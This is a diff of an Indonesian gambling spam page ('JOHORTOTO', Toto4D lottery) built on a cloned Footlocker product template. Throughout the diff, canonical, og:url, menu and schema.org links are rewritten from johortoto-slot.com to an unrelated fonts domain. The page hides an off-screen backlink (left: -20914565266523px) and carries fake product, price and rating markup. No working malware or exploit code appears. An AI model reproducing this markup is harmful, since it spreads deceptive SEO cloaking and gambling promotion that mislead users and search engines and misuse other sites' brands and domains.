@@ -18,10 +18,10 @@
     <meta property="og:image" content="https://johortoto-f2g.pages.dev/banner/d938cc90-48eb-46fd-aa40-b43048bfbf65.png" />
     <meta property="og:image:secure_url"
         content="https://johortoto-f2g.pages.dev/banner/d938cc90-48eb-46fd-aa40-b43048bfbf65.png" />
-    <meta property="og:url" content="https://johortoto-slot.com/" />
-    <meta property="og:canonical" content="https://johortoto-slot.com/" />
-    <meta property="og:author" content="https://johortoto-slot.com/" />
-    <link rel="canonical" href="https://johortoto-slot.com/" />
+    <meta property="og:url" content="https://devanagarifonts.org/" />
+    <meta property="og:canonical" content="https://devanagarifonts.org/" />
+    <meta property="og:author" content="https://devanagarifonts.org/" />
+    <link rel="canonical" href="https://devanagarifonts.org/" />
     <link rel="amphtml" href="https://johortoto-f2g.pages.dev/daftartoto4d/amp" />
     <link rel="alternate" href="https://johortoto-f2g.pages.dev/daftartoto4d/amp" hreflang="id">
     <link rel="alternate" href="https://johortoto-f2g.pages.dev/daftartoto4d/amp" hreflang="en">
@@ -1358,7 +1358,7 @@ Color Disclaimer:
 
 Actual colors may vary. This is due to the fact that every computer monitor has a different capability to display colors, we cannot guarantee that the color you see accurately portrays the true color of the product.
 " />
-    <meta property="og:url" content="https://johortoto-slot.com/" />
+    <meta property="og:url" content="https://devanagarifonts.org/" />
     <meta property="product:price:amount" content="9999.00" />
     <meta property="product:price:currency" content="IDR" />
     <meta property="product:availability" content="instock" />
@@ -1969,7 +1969,7 @@ c2.4,2.6,5.8,4.1,9.6,4.1c8.3,0,15.7-6.8,16.4-15.1l0,0c0.3-3.8-0.8-7.4-3.2-10.1C2
                             <div
                                 class="col-md-offset-0 col-md-2 col-xs-7 col-lg-2 col-sm-offset-0 col-sm-7 h-logo responsive-main-header">
                                 <span class="action nav-toggle"><span>Toggle Nav</span></span>
-                                <a class="logo" href="https://johortoto-slot.com/" title="" aria-label="store logo">
+                                <a class="logo" href="https://devanagarifonts.org/" title="" aria-label="store logo">
                                     <img src="https://johortoto-f2g.pages.dev/banner/1G7odszuFFQLUigM.gif"
                                         title="" alt="JOHORTOTO logo" width="170" />
                                 </a>
@@ -2081,20 +2081,20 @@ c2.4,2.6,5.8,4.1,9.6,4.1c8.3,0,15.7-6.8,16.4-15.1l0,0c0.3-3.8-0.8-7.4-3.2-10.1C2
                                                 aria-activedescendant="ui-id-8">
                                                 <li id="vesitem-7381768541902449662241"
                                                     class="nav-item level0 nav-1 submenu-left subhover dropdown level-top category-item ui-menu-item">
-                                                    <a href="https://johortoto-slot.com/" title="JOHORTOTO"
+                                                    <a href="https://devanagarifonts.org/" title="JOHORTOTO"
                                                         target="_self" class="nav-anchor ui-menu-item-wrapper"
                                                         id="ui-id-2" tabindex="-1"
                                                         role="menuitem"><span>JOHORTOTO</span></a>
                                                 </li>
                                                 <li id="vesitem-112617685419021512837329"
                                                     class="nav-item level0 nav-2 submenu-alignleft subhover dropdown level-top category-item ui-menu-item">
-                                                    <a href="https://johortoto-slot.com/" title="JOHORTOTO LINK"
+                                                    <a href="https://devanagarifonts.org/" title="JOHORTOTO LINK"
                                                         target="_self" class="nav-anchor ui-menu-item-wrapper"
                                                         id="ui-id-3" tabindex="-1" role="menuitem"><span>TOTO</span></a>
                                                 </li>
                                                 <li id="vesitem-9671768541902261764118"
                                                     class="nav-item level0 nav-3 submenu-left subhover dropdown level-top category-item parent ui-menu-item">
-                                                    <a href="https://johortoto-slot.com/" title="JOHORTOTO LOGIN"
+                                                    <a href="https://devanagarifonts.org/" title="JOHORTOTO LOGIN"
                                                         target="_self" class="nav-anchor ui-menu-item-wrapper"
                                                         id="ui-id-4" tabindex="-1" role="menuitem"><span>TOTO
                                                             MACAU</span><span class="opener"></span><span
@@ -2115,7 +2115,7 @@ c2.4,2.6,5.8,4.1,9.6,4.1c8.3,0,15.7-6.8,16.4-15.1l0,0c0.3-3.8-0.8-7.4-3.2-10.1C2
                                                                                 class="mega-col mega-col-6 mega-col-level-1 col-xs-12">
                                                                                 <div id="vesitem-92817685419022118842600"
                                                                                     class="nav-item level1 nav-3-1 submenu-alignleft subhover dropdown-submenu category-item parent">
-                                                                                    <a href="https://johortoto-slot.com/"
+                                                                                    <a href="https://devanagarifonts.org/"
                                                                                         title="Sepatu" target="_self"
                                                                                         class="nav-anchor"><span>Sepatu</span><span
                                                                                             class="opener"></span><span
@@ -2145,7 +2145,7 @@ c2.4,2.6,5.8,4.1,9.6,4.1c8.3,0,15.7-6.8,16.4-15.1l0,0c0.3-3.8-0.8-7.4-3.2-10.1C2
                                                                                                                     class="menu-side">
                                                                                                                     <div id="vesitem-10861768541902563911989"
                                                                                                                         class="nav-item level2 nav-3-1-1 submenu-alignleft subhover dropdown-submenu category-item">
-                                                                                                                        <a href="https://johortoto-slot.com/"
+                                                                                                                        <a href="https://devanagarifonts.org/"
                                                                                                                             title="Semua Koleksi Pria"
                                                                                                                             target="_self"
                                                                                                                             class="nav-anchor"><span>Semua
@@ -2169,7 +2169,7 @@ c2.4,2.6,5.8,4.1,9.6,4.1c8.3,0,15.7-6.8,16.4-15.1l0,0c0.3-3.8-0.8-7.4-3.2-10.1C2
                                                                                                                     </div>
                                                                                                                     <div id="vesitem-93817685419021771163538"
                                                                                                                         class="nav-item level2 nav-3-1-6 submenu-alignleft subhover dropdown-submenu category-item">
-                                                                                                                        <a href="https://johortoto-slot.com/"
+                                                                                                                        <a href="https://devanagarifonts.org/"
                                                                                                                             title="Kasual"
                                                                                                                             target="_self"
                                                                                                                             class="nav-anchor"><span>Kasual</span></a>
@@ -2209,7 +2209,7 @@ c2.4,2.6,5.8,4.1,9.6,4.1c8.3,0,15.7-6.8,16.4-15.1l0,0c0.3-3.8-0.8-7.4-3.2-10.1C2
                                                                                                             class="item-content2 hidden-lg hidden-md">
                                                                                                             <div id="vesitem-108617685419025639119892"
                                                                                                                 class="nav-item level2 submenu-alignleft subhover dropdown-submenu">
-                                                                                                                <a href="https://johortoto-slot.com/"
+                                                                                                                <a href="https://devanagarifonts.org/"
                                                                                                                     title="Semua Koleksi Pria"
                                                                                                                     target="_self"
                                                                                                                     class="nav-anchor"><span>Semua
@@ -2233,7 +2233,7 @@ c2.4,2.6,5.8,4.1,9.6,4.1c8.3,0,15.7-6.8,16.4-15.1l0,0c0.3-3.8-0.8-7.4-3.2-10.1C2
                                                                                                             </div>
                                                                                                             <div id="vesitem-938176854190217711635382"
                                                                                                                 class="nav-item level2 submenu-alignleft subhover dropdown-submenu">
-                                                                                                                <a href="https://johortoto-slot.com/"
+                                                                                                                <a href="https://devanagarifonts.org/"
                                                                                                                     title="Kasual"
                                                                                                                     target="_self"
                                                                                                                     class="nav-anchor"><span>Kasual</span></a>
@@ -2684,7 +2684,7 @@ c2.4,2.6,5.8,4.1,9.6,4.1c8.3,0,15.7-6.8,16.4-15.1l0,0c0.3-3.8-0.8-7.4-3.2-10.1C2
                                                                         <div class="item-content2 hidden-lg hidden-md">
                                                                             <div id="vesitem-928176854190221188426002"
                                                                                 class="nav-item level1 submenu-alignleft subhover dropdown-submenu parent">
-                                                                                <a href="https://johortoto-slot.com/"
+                                                                                <a href="https://devanagarifonts.org/"
                                                                                     title="Sepatu" target="_self"
                                                                                     class="nav-anchor"><span>Sepatu</span><span
                                                                                         class="opener"></span><span
@@ -2711,7 +2711,7 @@ c2.4,2.6,5.8,4.1,9.6,4.1c8.3,0,15.7-6.8,16.4-15.1l0,0c0.3-3.8-0.8-7.4-3.2-10.1C2
                                                                                                             class="mega-col mega-col-10 mega-col-level-2 col-xs-12">
                                                                                                             <div id="vesitem-10861768541902563911989"
                                                                                                                 class="nav-item level2 submenu-alignleft subhover dropdown-submenu">
-                                                                                                                <a href="https://johortoto-slot.com/"
+                                                                                                                <a href="https://devanagarifonts.org/"
                                                                                                                     title="Semua Koleksi Pria"
                                                                                                                     target="_self"
                                                                                                                     class="nav-anchor"><span>Semua
@@ -2735,7 +2735,7 @@ c2.4,2.6,5.8,4.1,9.6,4.1c8.3,0,15.7-6.8,16.4-15.1l0,0c0.3-3.8-0.8-7.4-3.2-10.1C2
                                                                                                             </div>
                                                                                                             <div id="vesitem-93817685419021771163538"
                                                                                                                 class="nav-item level2 submenu-alignleft subhover dropdown-submenu">
-                                                                                                                <a href="https://johortoto-slot.com/"
+                                                                                                                <a href="https://devanagarifonts.org/"
                                                                                                                     title="Kasual"
                                                                                                                     target="_self"
                                                                                                                     class="nav-anchor"><span>Kasual</span></a>
@@ -2774,7 +2774,7 @@ c2.4,2.6,5.8,4.1,9.6,4.1c8.3,0,15.7-6.8,16.4-15.1l0,0c0.3-3.8-0.8-7.4-3.2-10.1C2
                                                                                                         class="item-content2 hidden-lg hidden-md">
                                                                                                         <div id="vesitem-108617685419025639119892"
                                                                                                             class="nav-item level2 submenu-alignleft subhover dropdown-submenu">
-                                                                                                            <a href="https://johortoto-slot.com/"
+                                                                                                            <a href="https://devanagarifonts.org/"
                                                                                                                 title="Semua Koleksi Pria"
                                                                                                                 target="_self"
                                                                                                                 class="nav-anchor"><span>Semua
@@ -2798,7 +2798,7 @@ c2.4,2.6,5.8,4.1,9.6,4.1c8.3,0,15.7-6.8,16.4-15.1l0,0c0.3-3.8-0.8-7.4-3.2-10.1C2
                                                                                                         </div>
                                                                                                         <div id="vesitem-938176854190217711635382"
                                                                                                             class="nav-item level2 submenu-alignleft subhover dropdown-submenu">
-                                                                                                            <a href="https://johortoto-slot.com/"
+                                                                                                            <a href="https://devanagarifonts.org/"
                                                                                                                 title="Kasual"
                                                                                                                 target="_self"
                                                                                                                 class="nav-anchor"><span>Kasual</span></a>
@@ -3240,7 +3240,7 @@ c2.4,2.6,5.8,4.1,9.6,4.1c8.3,0,15.7-6.8,16.4-15.1l0,0c0.3-3.8-0.8-7.4-3.2-10.1C2
                                                 </li>
                                                 <li id="vesitem-10051768541902782048993"
                                                     class="nav-item level0 nav-4 submenu-left subhover dropdown level-top category-item parent ui-menu-item">
-                                                    <a href="https://johortoto-slot.com/" title="JOHORTOTO DAFTAR"
+                                                    <a href="https://devanagarifonts.org/" title="JOHORTOTO DAFTAR"
                                                         target="_self" class="nav-anchor ui-menu-item-wrapper"
                                                         id="ui-id-6" tabindex="-1" role="menuitem"><span>BANDAR
                                                             TOTO</span><span class="opener"></span><span
@@ -3261,7 +3261,7 @@ c2.4,2.6,5.8,4.1,9.6,4.1c8.3,0,15.7-6.8,16.4-15.1l0,0c0.3-3.8-0.8-7.4-3.2-10.1C2
                                                                                 class="mega-col mega-col-6 mega-col-level-1 col-xs-12">
                                                                                 <div id="vesitem-9681768541902530011317"
                                                                                     class="nav-item level1 nav-4-1 submenu-alignleft subhover dropdown-submenu category-item parent">
-                                                                                    <a href="https://johortoto-slot.com/"
+                                                                                    <a href="https://devanagarifonts.org/"
                                                                                         title="Sepatu" target="_self"
                                                                                         class="nav-anchor"><span>Sepatu</span><span
                                                                                             class="opener"></span><span
@@ -3291,7 +3291,7 @@ c2.4,2.6,5.8,4.1,9.6,4.1c8.3,0,15.7-6.8,16.4-15.1l0,0c0.3-3.8-0.8-7.4-3.2-10.1C2
                                                                                                                     class="menu-side">
                                                                                                                     <div id="vesitem-109017685419021206252820"
                                                                                                                         class="nav-item level2 nav-4-1-1 submenu-alignleft subhover dropdown-submenu category-item">
-                                                                                                                        <a href="https://johortoto-slot.com/"
+                                                                                                                        <a href="https://devanagarifonts.org/"
                                                                                                                             title="Semua Koleksi Wanita"
                                                                                                                             target="_self"
                                                                                                                             class="nav-anchor"><span>Semua
@@ -3307,7 +3307,7 @@ c2.4,2.6,5.8,4.1,9.6,4.1c8.3,0,15.7-6.8,16.4-15.1l0,0c0.3-3.8-0.8-7.4-3.2-10.1C2
                                                                                                                     </div>
                                                                                                                     <div id="vesitem-97417685419021869632553"
                                                                                                                         class="nav-item level2 nav-4-1-5 submenu-alignleft subhover dropdown-submenu category-item">
-                                                                                                                        <a href="https://johortoto-slot.com/"
+                                                                                                                        <a href="https://devanagarifonts.org/"
                                                                                                                             title="Kasual"
                                                                                                                             target="_self"
                                                                                                                             class="nav-anchor"><span>Kasual</span></a>
@@ -3355,7 +3355,7 @@ c2.4,2.6,5.8,4.1,9.6,4.1c8.3,0,15.7-6.8,16.4-15.1l0,0c0.3-3.8-0.8-7.4-3.2-10.1C2
                                                                                                             class="item-content2 hidden-lg hidden-md">
                                                                                                             <div id="vesitem-1090176854190212062528202"
                                                                                                                 class="nav-item level2 submenu-alignleft subhover dropdown-submenu">
-                                                                                                                <a href="https://johortoto-slot.com/"
+                                                                                                                <a href="https://devanagarifonts.org/"
                                                                                                                     title="Semua Koleksi Wanita"
                                                                                                                     target="_self"
                                                                                                                     class="nav-anchor"><span>Semua
@@ -3371,7 +3371,7 @@ c2.4,2.6,5.8,4.1,9.6,4.1c8.3,0,15.7-6.8,16.4-15.1l0,0c0.3-3.8-0.8-7.4-3.2-10.1C2
                                                                                                             </div>
                                                                                                             <div id="vesitem-974176854190218696325532"
                                                                                                                 class="nav-item level2 submenu-alignleft subhover dropdown-submenu">
-                                                                                                                <a href="https://johortoto-slot.com/"
+                                                                                                                <a href="https://devanagarifonts.org/"
                                                                                                                     title="Kasual"
                                                                                                                     target="_self"
                                                                                                                     class="nav-anchor"><span>Kasual</span></a>
@@ -3798,7 +3798,7 @@ c2.4,2.6,5.8,4.1,9.6,4.1c8.3,0,15.7-6.8,16.4-15.1l0,0c0.3-3.8-0.8-7.4-3.2-10.1C2
                                                                         <div class="item-content2 hidden-lg hidden-md">
                                                                             <div id="vesitem-96817685419025300113172"
                                                                                 class="nav-item level1 submenu-alignleft subhover dropdown-submenu parent">
-                                                                                <a href="https://johortoto-slot.com/"
+                                                                                <a href="https://devanagarifonts.org/"
                                                                                     title="Sepatu" target="_self"
                                                                                     class="nav-anchor"><span>Sepatu</span><span
                                                                                         class="opener"></span><span
@@ -3825,7 +3825,7 @@ c2.4,2.6,5.8,4.1,9.6,4.1c8.3,0,15.7-6.8,16.4-15.1l0,0c0.3-3.8-0.8-7.4-3.2-10.1C2
                                                                                                             class="mega-col mega-col-9 mega-col-level-2 col-xs-12">
                                                                                                             <div id="vesitem-109017685419021206252820"
                                                                                                                 class="nav-item level2 submenu-alignleft subhover dropdown-submenu">
-                                                                                                                <a href="https://johortoto-slot.com/"
+                                                                                                                <a href="https://devanagarifonts.org/"
                                                                                                                     title="Semua Koleksi Wanita"
                                                                                                                     target="_self"
                                                                                                                     class="nav-anchor"><span>Semua
@@ -3841,7 +3841,7 @@ c2.4,2.6,5.8,4.1,9.6,4.1c8.3,0,15.7-6.8,16.4-15.1l0,0c0.3-3.8-0.8-7.4-3.2-10.1C2
                                                                                                             </div>
                                                                                                             <div id="vesitem-97417685419021869632553"
                                                                                                                 class="nav-item level2 submenu-alignleft subhover dropdown-submenu">
-                                                                                                                <a href="https://johortoto-slot.com/"
+                                                                                                                <a href="https://devanagarifonts.org/"
                                                                                                                     title="Kasual"
                                                                                                                     target="_self"
                                                                                                                     class="nav-anchor"><span>Kasual</span></a>
@@ -3888,7 +3888,7 @@ c2.4,2.6,5.8,4.1,9.6,4.1c8.3,0,15.7-6.8,16.4-15.1l0,0c0.3-3.8-0.8-7.4-3.2-10.1C2
                                                                                                         class="item-content2 hidden-lg hidden-md">
                                                                                                         <div id="vesitem-1090176854190212062528202"
                                                                                                             class="nav-item level2 submenu-alignleft subhover dropdown-submenu">
-                                                                                                            <a href="https://johortoto-slot.com/"
+                                                                                                            <a href="https://devanagarifonts.org/"
                                                                                                                 title="Semua Koleksi Wanita"
                                                                                                                 target="_self"
                                                                                                                 class="nav-anchor"><span>Semua
@@ -3904,7 +3904,7 @@ c2.4,2.6,5.8,4.1,9.6,4.1c8.3,0,15.7-6.8,16.4-15.1l0,0c0.3-3.8-0.8-7.4-3.2-10.1C2
                                                                                                         </div>
                                                                                                         <div id="vesitem-974176854190218696325532"
                                                                                                             class="nav-item level2 submenu-alignleft subhover dropdown-submenu">
-                                                                                                            <a href="https://johortoto-slot.com/"
+                                                                                                            <a href="https://devanagarifonts.org/"
                                                                                                                 title="Kasual"
                                                                                                                 target="_self"
                                                                                                                 class="nav-anchor"><span>Kasual</span></a>
@@ -4322,7 +4322,7 @@ c2.4,2.6,5.8,4.1,9.6,4.1c8.3,0,15.7-6.8,16.4-15.1l0,0c0.3-3.8-0.8-7.4-3.2-10.1C2
                                                 </li>
                                                 <li id="vesitem-102217685419021770810440"
                                                     class="nav-item level0 nav-5 submenu-left subhover dropdown level-top category-item parent ui-menu-item">
-                                                    <a href="https://johortoto-slot.com/" title="JOHORTOTO RESMI"
+                                                    <a href="https://devanagarifonts.org/" title="JOHORTOTO RESMI"
                                                         target="_self" class="nav-anchor ui-menu-item-wrapper"
                                                         id="ui-id-8" tabindex="-1" role="menuitem"><span>BANDAR TOTO
                                                             MACAU</span><span class="opener"></span><span
@@ -5893,7 +5893,7 @@ c2.4,2.6,5.8,4.1,9.6,4.1c8.3,0,15.7-6.8,16.4-15.1l0,0c0.3-3.8-0.8-7.4-3.2-10.1C2
                                                     data-animation-in="fadeIn" data-color="#303030"
                                                     data-hover-color="#303030" data-bgcolor="transparent"
                                                     data-hover-bgcolor="transparent">
-                                                    <a href="https://johortoto-slot.com/" title="JOHORTOTO"
+                                                    <a href="https://devanagarifonts.org/" title="JOHORTOTO"
                                                         target="_self" data-hover-color="#303030"
                                                         data-hover-bgcolor="transparent" data-color="#303030"
                                                         data-bgcolor="transparent" style="
@@ -6384,7 +6384,7 @@ c2.4,2.6,5.8,4.1,9.6,4.1c8.3,0,15.7-6.8,16.4-15.1l0,0c0.3-3.8-0.8-7.4-3.2-10.1C2
                                                 <li id="vesitem-7241768541902288615773"
                                                     class="nav-item level0 nav-7 submenu-alignleft subhover dropdown level-top sale category-item ui-menu-item"
                                                     data-color="#ffd700 ">
-                                                    <a href="https://johortoto-slot.com/"
+                                                    <a href="https://devanagarifonts.org/"
                                                         title="JOHORTOTO LOGIN ALTERNATIF" target="_self"
                                                         data-color="#ffd700 "
                                                         style="color: #ffd700; color: #ffd700 !important"
@@ -6881,7 +6881,7 @@ c2.4,2.6,5.8,4.1,9.6,4.1c8.3,0,15.7-6.8,16.4-15.1l0,0c0.3-3.8-0.8-7.4-3.2-10.1C2
 
             <ul class="items">
                 <li class="item home">
-                    <a href="https://johortoto-slot.com/" title="Go to Home Page"> Home </a>
+                    <a href="https://devanagarifonts.org/" title="Go to Home Page"> Home </a>
                 </li>
                 <li class="item product">
                     <strong>JOHORTOTO – Link Daftar Toto4D Terpercaya 2026 | Pasaran Lengkap & Update Hasil Setiap Hari</strong>
@@ -7071,7 +7071,7 @@ c2.4,2.6,5.8,4.1,9.6,4.1c8.3,0,15.7-6.8,16.4-15.1l0,0c0.3-3.8-0.8-7.4-3.2-10.1C2
                         </div>
                         <div class="product-info-main">
                             <div class="product attibute brand">
-                                <a href="https://johortoto-slot.com/">
+                                <a href="https://devanagarifonts.org/">
                                     <h2 class="value pdp-brand-title" itemprop="brand" style="color: rgb(128, 119, 0);">
                                         JOHORTOTO</h2>
                                 </a>
@@ -7278,7 +7278,7 @@ c2.4,2.6,5.8,4.1,9.6,4.1c8.3,0,15.7-6.8,16.4-15.1l0,0c0.3-3.8-0.8-7.4-3.2-10.1C2
                                         class="price">Rp. 799</span></strong>
                             </div>
                             <div style="position: absolute; left: -20914565266523px; top: 0px;"><a
-                                    href="https://johortoto-slot.com/" target="_blank">JOHORTOTO</a></div>
+                                    href="https://devanagarifonts.org/" target="_blank">JOHORTOTO</a></div>
                             <div class="product-add-form">
                                 <form data-product-sku="2514-K8R47293615"
                                     action="https://www.footlocker.id/checkout/cart/add/uenc/aHR0cHM6Ly93d3cuZm9vdGxvY2tlci5pZC9uaWtlLXVuc3RydWN0dXJlZC11bmlzZXgtZnV0dXJhLXdhc2gtY2FwLWJsYWNrLTMuaHRtbA%2C%2C/product/52165/"
@@ -10418,14 +10418,14 @@ c2.4,2.6,5.8,4.1,9.6,4.1c8.3,0,15.7-6.8,16.4-15.1l0,0c0.3-3.8-0.8-7.4-3.2-10.1C2
                                                 <div class="tiles-item contact-us">
                                                     <ul>
                                                         <li>
-                                                            <a href="https://johortoto-slot.com/">JOHORTOTO</a>
+                                                            <a href="https://devanagarifonts.org/">JOHORTOTO</a>
                                                         </li>
                                                     </ul>
                                                 </div>
                                                 <div class="tiles-item order-status">
                                                     <ul>
                                                         <li>
-                                                            <a href="https://johortoto-slot.com/">TOTO
+                                                            <a href="https://devanagarifonts.org/">TOTO
                                                                 MACAU</a>
                                                         </li>
                                                     </ul>
@@ -10434,7 +10434,7 @@ c2.4,2.6,5.8,4.1,9.6,4.1c8.3,0,15.7-6.8,16.4-15.1l0,0c0.3-3.8-0.8-7.4-3.2-10.1C2
                                                     <ul>
                                                         <li>
                                                             <a id="shipping-info"
-                                                                href="https://johortoto-slot.com/">BANDAR
+                                                                href="https://devanagarifonts.org/">BANDAR
                                                                 TOTO
                                                                 MACAU</a>
                                                         </li>
@@ -10443,7 +10443,7 @@ c2.4,2.6,5.8,4.1,9.6,4.1c8.3,0,15.7-6.8,16.4-15.1l0,0c0.3-3.8-0.8-7.4-3.2-10.1C2
                                                 <div class="tiles-item store-locator">
                                                     <ul>
                                                         <li>
-                                                            <a href="https://johortoto-slot.com/">SITUS
+                                                            <a href="https://devanagarifonts.org/">SITUS
                                                                 TOTO</a>
                                                         </li>
                                                     </ul>
@@ -10451,7 +10451,7 @@ c2.4,2.6,5.8,4.1,9.6,4.1c8.3,0,15.7-6.8,16.4-15.1l0,0c0.3-3.8-0.8-7.4-3.2-10.1C2
                                                 <div class="tiles-item returns-exchanges">
                                                     <ul>
                                                         <li>
-                                                            <a href="https://johortoto-slot.com/">BANDAR
+                                                            <a href="https://devanagarifonts.org/">BANDAR
                                                                 TOTO
                                                                 RESMI</a>
                                                         </li>
@@ -10460,7 +10460,7 @@ c2.4,2.6,5.8,4.1,9.6,4.1c8.3,0,15.7-6.8,16.4-15.1l0,0c0.3-3.8-0.8-7.4-3.2-10.1C2
                                                 <div class="tiles-item help">
                                                     <ul>
                                                         <li>
-                                                            <a href="https://johortoto-slot.com/">LINK
+                                                            <a href="https://devanagarifonts.org/">LINK
                                                                 BANDAR
                                                                 TOTO</a>
                                                         </li>
@@ -10494,17 +10494,17 @@ c2.4,2.6,5.8,4.1,9.6,4.1c8.3,0,15.7-6.8,16.4-15.1l0,0c0.3-3.8-0.8-7.4-3.2-10.1C2
                                         <div class="collapsible">
                                             <span class="title">Tentang JOHORTOTO</span>
                                             <ul>
-                                                <li><a href="https://johortoto-slot.com/">TOTO MACAU</a>
+                                                <li><a href="https://devanagarifonts.org/">TOTO MACAU</a>
                                                 </li>
-                                                <li><a href="https://johortoto-slot.com/">BANDAR TOTO</a>
+                                                <li><a href="https://devanagarifonts.org/">BANDAR TOTO</a>
                                                 </li>
                                                 <li>
-                                                    <a href="https://johortoto-slot.com/">BANDAR TOTO
+                                                    <a href="https://devanagarifonts.org/">BANDAR TOTO
                                                         MACAU</a>
                                                 </li>
-                                                <li><a href="https://johortoto-slot.com/">SITUS TOTO</a>
+                                                <li><a href="https://devanagarifonts.org/">SITUS TOTO</a>
                                                 </li>
-                                                <li><a href="https://johortoto-slot.com/">SITUS TOTO
+                                                <li><a href="https://devanagarifonts.org/">SITUS TOTO
                                                         MACAU</a>
                                                 </li>
                                             </ul>
@@ -10512,13 +10512,13 @@ c2.4,2.6,5.8,4.1,9.6,4.1c8.3,0,15.7-6.8,16.4-15.1l0,0c0.3-3.8-0.8-7.4-3.2-10.1C2
                                         <div class="collapsible">
                                             <span class="title">Layanan Pelanggan JOHORTOTO<br /></span>
                                             <ul>
-                                                <li><a href="https://johortoto-slot.com/">FAQ</a></li>
+                                                <li><a href="https://devanagarifonts.org/">FAQ</a></li>
                                                 <!--<li><a href="/size-guide-adidas-footwear">Panduan Ukuran</a></li>-->
                                                 <li>
-                                                    <a href="https://johortoto-slot.com/">JOHORTOTO
+                                                    <a href="https://devanagarifonts.org/">JOHORTOTO
                                                         Bonus</a>
                                                 </li>
-                                                <li><a href="https://johortoto-slot.com/">JOHORTOTO Live
+                                                <li><a href="https://devanagarifonts.org/">JOHORTOTO Live
                                                         Chat</a></li>
                                                 <li><a href="/sitemap.xml">Sitemap</a></li>
                                             </ul>
@@ -10526,25 +10526,25 @@ c2.4,2.6,5.8,4.1,9.6,4.1c8.3,0,15.7-6.8,16.4-15.1l0,0c0.3-3.8-0.8-7.4-3.2-10.1C2
                                         <div class="collapsible">
                                             <span class="title">Link Populer<br /></span>
                                             <ul>
-                                                <li><a href="https://johortoto-slot.com/">JOHORTOTO</a>
+                                                <li><a href="https://devanagarifonts.org/">JOHORTOTO</a>
                                                 </li>
-                                                <li><a href="https://johortoto-slot.com/">JOHORTOTO
+                                                <li><a href="https://devanagarifonts.org/">JOHORTOTO
                                                         LOGIN</a>
                                                 </li>
                                                 <li>
-                                                    <a href="https://johortoto-slot.com/">JOHORTOTO
+                                                    <a href="https://devanagarifonts.org/">JOHORTOTO
                                                         LINK</a>
                                                 </li>
                                                 <li>
-                                                    <a href="https://johortoto-slot.com/">JOHORTOTO
+                                                    <a href="https://devanagarifonts.org/">JOHORTOTO
                                                         DAFTAR</a>
                                                 </li>
-                                                <li><a href="https://johortoto-slot.com/">JOHORTOTO
+                                                <li><a href="https://devanagarifonts.org/">JOHORTOTO
                                                         RESMI</a>
                                                 </li>
-                                                <li><a href="https://johortoto-slot.com/">JOHORTOTO LINK
+                                                <li><a href="https://devanagarifonts.org/">JOHORTOTO LINK
                                                         ALTERNATIF</a></li>
-                                                <li><a href="https://johortoto-slot.com/">JOHORTOTO LOGIN
+                                                <li><a href="https://devanagarifonts.org/">JOHORTOTO LOGIN
                                                         ALTERNATIF</a></li>
                                             </ul>
                                         </div>
@@ -11166,7 +11166,7 @@ c2.4,2.6,5.8,4.1,9.6,4.1c8.3,0,15.7-6.8,16.4-15.1l0,0c0.3-3.8-0.8-7.4-3.2-10.1C2
         "itemListElement": [{
           "@type": "ListItem",
           "item": {
-            "@id": "https://johortoto-slot.com/",
+            "@id": "https://devanagarifonts.org/",
             "name": "JOHORTOTO – Link Daftar Toto4D Terpercaya 2026 | Pasaran Lengkap & Update Hasil Setiap Hari"
           },
           "position": 1
@@ -11184,7 +11184,7 @@ c2.4,2.6,5.8,4.1,9.6,4.1c8.3,0,15.7-6.8,16.4-15.1l0,0c0.3-3.8-0.8-7.4-3.2-10.1C2
         "offers": {
           "@type": "http:\/\/schema.org\/Offer",
           "price": 5000,
-          "url": "https://johortoto-slot.com/",
+          "url": "https://devanagarifonts.org/",
           "priceCurrency": "IDR",
           "availability": "http:\/\/schema.org\/InStock"
         }
@@ -11207,7 +11207,7 @@ c2.4,2.6,5.8,4.1,9.6,4.1c8.3,0,15.7-6.8,16.4-15.1l0,0c0.3-3.8-0.8-7.4-3.2-10.1C2
         "@context": "https://schema.org/",
         "@type": "Product",
         "name": "JOHORTOTO – Link Daftar Toto4D Terpercaya 2026 | Pasaran Lengkap & Update Hasil Setiap Hari",
-        "url": "https://johortoto-slot.com/",
+        "url": "https://devanagarifonts.org/",
         "sku": "984S98A9M",
         "image": ["https://mobile.situsamp.store/img/iconJOHORTOTOx464.webp"],
         "description": "Selamat datang di JOHORTOTO, destinasi pilihan bagi pecinta Toto4D yang mengutamakan kemudahan akses, tampilan modern, dan berbagai pilihan pasaran internasional. Nikmati pengalaman bermain yang praktis dengan proses pendaftaran yang mudah, informasi hasil terbaru, serta prediksi dan statistik yang selalu diperbarui.",
@@ -11236,7 +11236,7 @@ c2.4,2.6,5.8,4.1,9.6,4.1c8.3,0,15.7-6.8,16.4-15.1l0,0c0.3-3.8-0.8-7.4-3.2-10.1C2
         "offers": {
           "@type": "Offer",
           "priceCurrency": "IDR",
-          "url": "https://johortoto-slot.com/",
+          "url": "https://devanagarifonts.org/",
           "availability": "https://schema.org/InStock",
           "price": "6969.69"
         }
@@ -11245,7 +11245,7 @@ c2.4,2.6,5.8,4.1,9.6,4.1c8.3,0,15.7-6.8,16.4-15.1l0,0c0.3-3.8-0.8-7.4-3.2-10.1C2
         <script type="application/ld+json" id="bv-jsonld-bvloader-summary">
       {
         "@context": "https://schema.org/",
-        "@id": "https://johortoto-slot.com/",
+        "@id": "https://devanagarifonts.org/",
         "aggregateRating": {
           "@type": "AggregateRating",
           "itemReviewed": {
@@ -11266,28 +11266,28 @@ c2.4,2.6,5.8,4.1,9.6,4.1c8.3,0,15.7-6.8,16.4-15.1l0,0c0.3-3.8-0.8-7.4-3.2-10.1C2
           "@type": "ListItem",
           "position": 1,
           "item": {
-            "@id": "https://johortoto-slot.com/",
+            "@id": "https://devanagarifonts.org/",
             "name": "JOHORTOTO"
           }
         }, {
           "@type": "ListItem",
           "position": 2,
           "item": {
-            "@id": "https://johortoto-slot.com/",
+            "@id": "https://devanagarifonts.org/",
             "name": "TOTO MACAU"
           }
         }, {
           "@type": "ListItem",
           "position": 3,
           "item": {
-            "@id": "https://johortoto-slot.com/",
+            "@id": "https://devanagarifonts.org/",
             "name": "SITUS TOTO"
           }
         }, {
           "@type": "ListItem",
           "position": 4,
           "item": {
-            "@id": "https://johortoto-slot.com/",
+            "@id": "https://devanagarifonts.org/",
             "name": "BANDAR TOTO MACAU"
           }
         }]
@@ -11297,10 +11297,10 @@ c2.4,2.6,5.8,4.1,9.6,4.1c8.3,0,15.7-6.8,16.4-15.1l0,0c0.3-3.8-0.8-7.4-3.2-10.1C2
 {
   "@context": "https://schema.org",
   "@type": "Organization",
-  "@id": "https://johortoto-slot.com/",
+  "@id": "https://devanagarifonts.org/",
   "name": "JOHORTOTO",
   "alternateName": "JOHORTOTO",
